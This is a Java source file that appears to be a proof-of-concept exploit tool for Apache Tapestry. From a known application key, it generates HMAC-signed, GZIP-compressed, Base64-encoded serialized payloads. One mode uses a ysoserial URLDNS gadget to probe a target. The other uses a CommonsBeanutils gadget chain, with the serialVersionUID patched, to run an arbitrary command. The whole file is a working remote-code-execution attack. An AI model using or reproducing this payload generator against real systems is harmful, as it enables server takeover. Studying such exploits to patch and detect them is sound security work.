package com.tapestry.poc;

import ysoserial.payloads.URLDNS;

import javax.crypto.Mac;
import javax.crypto.spec.SecretKeySpec;
import java.io.*;
import java.nio.charset.StandardCharsets;
import java.util.Base64;
import java.util.zip.GZIPOutputStream;



public class TapestryExploit {
    private static final String HMAC_SHA1 = "HmacSHA1";


    private static byte[] replaceBytes(byte[] source, byte[] oldBytes, byte[] newBytes){
        byte[] result = new byte[source.length - oldBytes.length + newBytes.length];
        index: for (int i = 0; i < source.length; i++){
            result[i] = source[i];
            if (i >= oldBytes.length - 1){
                // 当前游标的长度满足于oldByte的长度比较值, 开始比较实际内容
                for (int j = 0; j < oldBytes.length; j++){
                    if (source[i - (oldBytes.length - 1) + j] != oldBytes[j]){
                        continue index;
                    }
                }
                // 成功匹配oldBytes, 开始替换newBytes
                for (int j = 0; j < newBytes.length; j++){
                    result[i - (oldBytes.length - 1) + j] = newBytes[j];
                }
                i += newBytes.length - oldBytes.length;
            }
        }
        return result;
    }

    private static void generateCB2Data(String key, String command) {
        try {
            final byte[] byteKey = key.getBytes(StandardCharsets.UTF_8);
            Mac sha1Hmac = Mac.getInstance(HMAC_SHA1);
            SecretKeySpec keySpec = new SecretKeySpec(byteKey, HMAC_SHA1);
            sha1Hmac.init(keySpec);


            ByteArrayOutputStream b1 = new ByteArrayOutputStream();
            ObjectOutputStream output = new ObjectOutputStream(b1);
            output.writeUTF("222222"); // componentId
            output.writeBoolean(false); // cancelAction
            output.writeObject(CommonsBeanutils2.getObject(command));
            output.flush();


            // 替换 serialVersionUID
            byte[] serData = b1.toByteArray();
            byte[] oldUid = {(byte) 0xE3, (byte) 0xA1, (byte) 0x88, (byte) 0xEA, 0x73, 0x22, (byte) 0xA4, 0x48}; // commons-beanutils  1.9.2
            byte[] newUid = {(byte) 0xCF, (byte) 0x8E, (byte) 0x01, (byte) 0x82, (byte) 0xFE, 0x4E, (byte) 0xF1, 0x7E};  //commons-beanutils  1.8.3
            serData = replaceBytes(serData, oldUid, newUid);

//            FileOutputStream fos = new FileOutputStream("a.ser");
//            fos.write(serData);
//            fos.close();
//            ObjectInputStream ois = new ObjectInputStream(new FileInputStream("a.ser"));
//            ois.readObject();
//            ois.close();

            // GZIP压缩
            ByteArrayOutputStream out = new ByteArrayOutputStream();
            GZIPOutputStream bos = new GZIPOutputStream(out);
            bos.write(serData);
            bos.close();

            // 计算hmac
            byte[] array = out.toByteArray();
            sha1Hmac.update(array);
            byte[] macData = sha1Hmac.doFinal();
            byte[] prefix = Base64.getEncoder().encode(macData);

            // 拼接成最后的payload
            String payload = new String(Base64.getEncoder().encode(out.toByteArray()));
            System.out.println(new String(prefix) + ":" + payload);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static void generateDNSData(String key, String URL){
        try {
            final byte[] byteKey = key.getBytes(StandardCharsets.UTF_8);
            Mac sha1Hmac = Mac.getInstance(HMAC_SHA1);
            SecretKeySpec keySpec = new SecretKeySpec(byteKey, HMAC_SHA1);
            sha1Hmac.init(keySpec);


            ByteArrayOutputStream b1 = new ByteArrayOutputStream();
            ObjectOutputStream output = new ObjectOutputStream(b1);
            output.writeUTF("222222"); // componentId
            output.writeBoolean(false); // cancelAction
            output.writeObject(new URLDNS().getObject(URL));
            output.flush();

            byte[] serData = b1.toByteArray();

            // GZIP压缩
            ByteArrayOutputStream out = new ByteArrayOutputStream();
            GZIPOutputStream bos = new GZIPOutputStream(out);
            bos.write(serData);
            bos.close();

            // 计算hmac
            byte[] array = out.toByteArray();
            sha1Hmac.update(array);
            byte[] macData = sha1Hmac.doFinal();
            byte[] prefix = Base64.getEncoder().encode(macData);

            // 拼接成最后的payload
            String payload = new String(Base64.getEncoder().encode(out.toByteArray()));
            System.out.println(new String(prefix) + ":" + payload);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static void printHelp() {
        System.out.println("[Usage]: \n" +
                "\tjava TapestryExploit [Tapestry Key] DNS [URL]\n" +
                "\tjava TapestryExploit [Tapestry Key] CB2 [Command]\n");
        System.exit(0);
    }

    public static void main(String[] args) {
        if( args.length <3)
        {
            printHelp();
        }

        String key = args[0];
        String type = args[1];
        String urlOrCommand = args[2];
        if(type.equals("DNS")) {
            generateDNSData(key, urlOrCommand);
        }else if (type.equals("CB2")) {
            generateCB2Data(key, urlOrCommand);
        } else {
            printHelp();
        }
    }
}